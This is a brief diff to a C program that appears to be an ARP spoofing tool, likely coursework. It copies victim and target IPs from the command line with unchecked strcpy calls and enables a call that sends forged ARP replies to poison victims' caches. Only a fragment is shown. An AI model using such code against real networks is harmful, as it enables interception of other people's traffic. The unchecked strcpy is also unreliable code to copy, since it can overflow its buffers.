@@ -36,10 +36,10 @@ int main(int argc, char* argv[]) {
     while (1) {
         if (cnt == (argc / 2)) break;
         
-        sender_ip = argv[cnt*2];
-        target_ip = argv[cnt*2+1];
+        strcpy(sender_ip, argv[cnt*2]);
+        strcpy(target_ip, argv[cnt*2+1]);
         check_sender_mac(sender_ip, sender_mac, attack_ip, attack_mac, handle);
-        //send_arp_reply(sender_ip, sender_mac, target_ip, attack_mac, handle);
+        send_arp_reply(sender_ip, sender_mac, target_ip, attack_mac, handle);
         printf("Success. Victim: %s\n", argv[cnt*2]);
 
         cnt++;
